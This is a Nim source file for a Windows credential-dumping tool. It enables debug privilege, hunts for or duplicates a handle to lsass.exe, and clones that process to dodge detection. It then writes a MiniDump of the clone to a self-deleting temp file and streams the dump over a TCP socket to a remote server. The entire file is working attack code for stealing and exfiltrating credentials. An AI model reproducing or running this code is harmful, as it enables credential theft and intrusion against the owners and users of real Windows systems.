import winim
import ptr_math
import std/[strformat, strutils, dynlib, tables, net]

type
    NtQuerySystemInformation_t = proc(SystemInformationClass: ULONG, SystemInformation: PVOID, SystemInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
    NtDuplicateObject_t = proc(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
    NtCreateProcessEx_t = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}
    NtGetNextProcess_t = proc(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.stdcall.}

proc isElevatedProcess(): bool =
    var isElevated: bool
    var token: HANDLE

    if OpenProcessToken(cast[HANDLE](-1), TOKEN_QUERY, addr token) != 0:
        var elevation: TOKEN_ELEVATION
        var token_check: DWORD = cast[DWORD](sizeof TOKEN_ELEVATION)
        if GetTokenInformation(token, tokenElevation, addr elevation, cast[DWORD](sizeof elevation), addr token_check) != 0:
            isElevated = if elevation.TokenIsElevated != 0: true else: false
    CloseHandle(token)
    return isElevated

proc SetPrivilege(hToken: HANDLE, lpszPrivilege: LPCTSTR, bEnablePrivilege: BOOL): bool =
    var
        tp: TOKEN_PRIVILEGES
        luid: LUID

    if LookupPrivilegeValue(NULL, lpszPrivilege, addr luid) == 0:
        echo "[-] LookupPrivilegeValue error: ", GetLastError()
        return true

    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = if bEnablePrivilege: SE_PRIVILEGE_ENABLED else: 0

    if AdjustTokenPrivileges(hToken, cast[WINBOOL](FALSE), addr tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL)) == 0:
        echo "[-] AdjustTokenPrivileges error: ", GetLastError()
        return false

    if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
        echo "[-] The token does not have the specified privilege."
        return false

    return true

proc enumLsassHandles(): seq[(ULONG, HANDLE)] =
    var status: NTSTATUS
    var ntdll = loadLib("ntdll.dll")
    var 
        NtQuerySystemInformation = cast[NtQuerySystemInformation_t](ntdll.symAddr("NtQuerySystemInformation"))
        NtDuplicateObject = cast[NtDuplicateObject_t](ntdll.symAddr("NtDuplicateObject"))

    var lsassHandles: seq[(ULONG, HANDLE)] = @[]
    var handleInfo = initTable[ULONG, seq[USHORT]]() #Key = PID, Value = Seq[HANDLE]
    var dupHandle: HANDLE

    var rtrnLength: ULONG = 0
    var shiBuffer = VirtualAlloc(NULL, sizeof(SYSTEM_HANDLE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
   
    status = NtQuerySystemInformation(0x10, cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer), cast[ULONG](sizeof(SYSTEM_HANDLE_INFORMATION)), addr rtrnLength)
    while status == STATUS_INFO_LENGTH_MISMATCH: 
        VirtualFree(shiBuffer, 0, MEM_RELEASE)
        #[echo "[!] NtQuerySystemInformation return length: ", rtrnLength
        if VirtualFree(shiBuffer, 0, MEM_RELEASE) != 0:
            echo "[!] Memory Buffer released!"
        ]#
        shiBuffer = VirtualAlloc(NULL, rtrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        status = NtQuerySystemInformation(0x10, cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer), rtrnLength, addr rtrnLength)
    if NT_SUCCESS(status) != true:
        echo "[-] NtQuerySystemInformation failed!"
        quit(1)
    #echo "[!] Returned: ", rtrnLength
    var shi = cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer)
    var handleC = shi.Count
    echo "[!] Number of Handles: ", handleC
    var shiEnd = shiBuffer + rtrnLength

    #discard readLine(stdin)
    var sHandle = shiBuffer + sizeof(LONG)

    while cast[int](sHandle) <= cast[int](shiEnd):
        sHandle += sizeof(LONG)
        var sysHandle = cast[PSYSTEM_HANDLE_INFORMATION](sHandle).Handle[0]
        if not handleInfo.hasKey(sysHandle.OwnerPid) and (sysHandle.ObjectType != 0 and sysHandle.HandleFlags != 0 and (sysHandle.HandleValue != 0 and sysHandle.HandleValue != 65535)):
            handleInfo[sysHandle.OwnerPid] = @[]
            handleInfo[sysHandle.OwnerPid].add(sysHandle.HandleValue)

    echo "[!] Attempting to Duplicate Found Handles"
    for pid in handleInfo.keys:
        #echo "PID: ", pid, " | Handle: ", handleInfo[pid]
        if pid == 4:
            continue
        
        for syshandle in handleInfo[pid]:
            var pHandle: HANDLE = OpenProcess(PROCESS_DUP_HANDLE, FALSE, cast[DWORD](pid))
            #[if GetLastError() == 0:
                echo "[+] OpenProcess Succeeded! Handle: ", toHex(pHandle)
            else:
                continue]#
            if GetLastError() != 0:
                continue
            status = NtDuplicateObject(pHandle, cast[HANDLE](syshandle), cast[HANDLE](-1), addr dupHandle, PROCESS_CREATE_PROCESS, 0, 0)
            #status = NtDuplicateObject(pHandle, cast[HANDLE](-1), GetCurrentProcess(), addr dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)
            if NT_SUCCESS(status) != true:
                continue
            #[else:
                echo "[+] NtDuplicateObject Succeeded! New Handle: 0x", toHex(dupHandle)
            ]#

            var oinfo: OBJECT_TYPE_INFORMATION
            var oinfoBuffer = VirtualAlloc(NULL, sizeof(OBJECT_TYPE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
            var ortrnLength: ULONG

            status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, cast[ULONG](sizeof(OBJECT_TYPE_INFORMATION)), addr ortrnLength)
            
            while status == STATUS_INFO_LENGTH_MISMATCH: 
                VirtualFree(oinfoBuffer, 0, MEM_RELEASE)
                #[echo "[!] NtQueryObject Failed Due to STATUS_INFO_LENGTH_MISMATCH Error! Length Returned: ", ortrnLength
                if VirtualFree(oinfoBuffer, 0, MEM_RELEASE) != 0:
                    echo "[!] Memory Buffer Released!"
                echo "[!] Retrying..."
                ]#
                oinfoBuffer = VirtualAlloc(NULL, ortrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
                status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, ortrnLength, addr ortrnLength)

            #echo "\n[!] Memory Buffer Allocated at: 0x", toHex(cast[int](oinfoBuffer))

            if NT_SUCCESS(status) != true:
                echo "[-] NtQueryObject Failed! | Error Code: ", toHex($status)
                quit(1)
            #[else:
                echo "[+] NtQueryObject Succeeded!"
            ]#
            oinfo = cast[OBJECT_TYPE_INFORMATION](oinfoBuffer)
            var pname: cstring

            var pname_size: DWORD = 4096
           
            var oinfoTypeNameBufferValuePtr = oinfoBuffer+0x68
            var oinfoTypeNameBufferValue = cast[PWSTR](oinfoTypeNameBufferValuePtr)

            if $oinfoTypeNameBufferValue == "Process":
                if QueryFullProcessImageNameW(dupHandle, 0, pname, addr pname_size) != 0:
                    echo "[+] QueryFullProcessImageNameW Succeeded! Process Handle Found!"
                    if cmpIgnoreCase(winim.winstr.`$`pname, "lsass.exe") == 0:
                        echo "[+] Suitable Handle to LSASS Found! | PID: ", pid, " | HANDLE: ", toHex($syshandle), "\n"
                        lsassHandles.add((pid, dupHandle))
                    else:
                        CloseHandle(cast[HANDLE](syshandle))
                        CloseHandle(dupHandle)
                else:
                    echo "[-] QueryFullProcessImageNameW Failed! Error Code: ", GetLastError()
                    quit(1)
    VirtualFree(shiBuffer, 0, MEM_RELEASE)
    return lsassHandles

when isMainModule:
    var hNtdll = loadLib("ntdll.dll")
    #var hComsvcs = loadLib("comsvcs.dll")
    var status: NTSTATUS
    var procOA: OBJECT_ATTRIBUTES

    InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)

    var 
        NtCreateProcessEx = cast[NtCreateProcessEx_t](hNtdll.symAddr("NtCreateProcessEx"))
        NtGetNextProcess = cast[NtGetNextProcess_t](hNtdll.symAddr("NtGetNextProcess"))
    
    var hToken: HANDLE

    if isElevatedProcess() == false:
        echo "[-] Process Not Running Elevated!\n[!] Quitting..."
        quit(1)

    echo "[!] Checking for Debug privilege..."
    if OpenProcessToken(cast[HANDLE](-1), TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0 and SetPrivilege(hToken, SE_DEBUG_NAME, TRUE):
        echo "[+] Debug privilege enabled!\n"
        CloseHandle(hToken)
    else:
        echo "[-] Failed to Enable SeDebugPrivilege\n[!] Quitting..."
        #discard readLine(stdin)

    var dupHandlesSeq = enumLsassHandles()
    var victimHandle: HANDLE = cast[HANDLE](NULL)

    {.emit: "char procName[4096];".}
    var procName {.importc, nodecl.}: cstring

    var pid: DWORD
    var count: int = 1

    if dupHandlesSeq.len == 0:
        echo "\n[-] No Suitable Handles Could Be Duplicated.\n[!] Attempting Risky Operation: Opening Handle Directly to Lsass Process...\n"

        while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
            #echo "Loop: ", count
            #echo "Handle: ", victimHandle
            count += 1

            if GetProcessImageFileNameA(victimHandle, procName, MAX_PATH) == 0:
                echo procName
                echo "GPIFNA Failed! Error: ", GetLastError()
                quit(1)

            if lstrcmpiA("lsass.exe", PathFindFileNameA(procName)) == 0:
                pid = GetProcessId(victimHandle)
                echo fmt"[+] Found PID {pid} and Obtained Handle {victimHandle} (0x{toHex(victimHandle)})" 
                break
        
        #discard readLine(stdin)
        if victimHandle == 0:
            echo "[-] Error: ", GetLastError(), " | Failed to Obtain Handle to Process!"
            echo "[!] Quitting!"
            quit(1)
        else:
            dupHandlesSeq.add((pid, victimHandle))

    echo "[!] Cloning Process..."
    for handleTuple in dupHandlesSeq:
        status = NtCreateProcessEx(addr victimHandle, PROCESS_ALL_ACCESS, addr procOA, handleTuple[1], cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)
        if NT_SUCCESS(status):
            echo "[+] Successfully Cloned to New PID: ", GetProcessId(victimHandle), "\n"
            break
        else:
            echo "[-] Error Cloning Process: ", toHex($status)
            #discard readLine(stdin)

    if NT_SUCCESS(status) == false:
        echo "[-] Failed to Clone Process. Quitting..."
        quit(1)
    #discard readLine(stdin)

    var IoStatusBlock: IO_STATUS_BLOCK
    var fileDI: FILE_DISPOSITION_INFORMATION
    fileDI.DoDeleteFile = TRUE

    echo "[!] Creating Temporary File and Marking as Delete On Close..."
    var outFile = CreateFile("twin.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))

    if outFile == INVALID_HANDLE_VALUE:
        echo "[-] Dump File Could Not Be Created In Current Directory! Error: ", GetLastError(), "\n[!]Quitting..."
        TerminateProcess(victimHandle, 0)
        CloseHandle(victimHandle)
        CloseHandle(outFile)
        quit(1)

    status = NtSetInformationFile(outFile, addr IoStatusBlock, addr fileDI, cast[ULONG](sizeof(fileDI)), 13)
    
    if NT_SUCCESS(status) == false:
        echo "[-] NtSetInformationFile Failed! Error: ", toHex($status)
        quit(1)
    
    var miniDump = MiniDumpWriteDump(victimHandle, 0, outFile, 0x00000002, NULL, NULL, NULL)
    if miniDump == TRUE:
        echo "[+] Sucessfully Dumped Evil Twin!"
        TerminateProcess(victimHandle, 0)
        #discard readLine(stdin)
    else: 
        echo fmt"[-] MDWP Failed! Error: {GetLastError()}.\n[!] Quitting..."
        TerminateProcess(victimHandle, 0)
        CloseHandle(outFile)
    
    if miniDump == FALSE:
        quit(1)

    var size: DWORD = GetFileSize(outFile, NULL)
    var hMapping: HANDLE = CreateFileMapping(outFile, NULL, PAGE_READONLY, 0, 0, "")

    var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
    echo "\n[!] Mapped Data at: 0x", repr mappedData, " - Size: ", size
    
    var dataPointer = mappedData
    #var dumpSeq: seq[byte] = @[]
    #var countDP: int = 1
    let socket = newSocket()
    socket.connect("0.0.0.0", Port(6500))

    echo "\n[!] Sending Data to Server..."
    var bytesSent: int = 0
    while dataPointer <= (mappedData + size):
        if (size.int - bytesSent) < 4096:
            bytesSent += socket.send(dataPointer, (size.int - bytesSent))
            break
        else: 
            bytesSent += socket.send(dataPointer, 4096)
            dataPointer += 4096

    echo "\n[!] Sent ", bytesSent, " Bytes"
    if bytesSent < size.int:
        echo "[!] Bytes Sent (", bytesSent, ") Less Than Section Data (", size, ")...\n[!] File May Be Corrupted on Server"

    echo "\n[!] Cleaning Up..."
    
    socket.close()
    UnmapViewOfFile(mappedData)
    #discard readLine(stdin)
    for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
    
    #discard readLine(stdin)
    CloseHandle(outFile)
    CloseHandle(hMapping)

    echo "[!] Done!"
